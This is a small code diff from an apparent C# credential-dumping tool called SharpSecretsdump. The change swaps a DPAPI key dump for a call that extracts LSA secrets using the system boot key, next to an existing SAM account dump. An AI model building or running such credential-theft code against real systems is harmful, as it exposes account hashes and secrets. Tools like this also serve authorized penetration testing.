@@ -37,7 +37,7 @@ namespace SharpSecretsdump
             Console.WriteLine($"[*] Target system bootKey: 0x{BitConverter.ToString(bootkey).Replace("-", "").ToLower()}");
 
             Helpers.GetSamAccounts(bootkey);
-            LSADump.GetDPAPIKeys(true);
+            Helpers.GetLsaSecrets(bootkey);
 
             if (!alreadySystem)
             {
